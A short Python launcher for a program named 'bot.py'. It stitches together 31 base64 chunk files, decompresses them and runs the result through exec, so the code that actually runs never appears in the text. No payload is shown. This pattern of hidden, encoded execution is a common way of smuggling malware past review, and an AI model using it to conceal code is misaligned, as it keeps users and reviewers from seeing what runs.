# language: Python 3.11+
import zlib, base64
from pathlib import Path
_p = "".join(Path(__file__).with_name(f"s{i}.b64").read_text(encoding="utf-8") for i in range(31))
exec(compile(zlib.decompress(base64.b64decode(_p)), "bot.py", "exec"), globals())
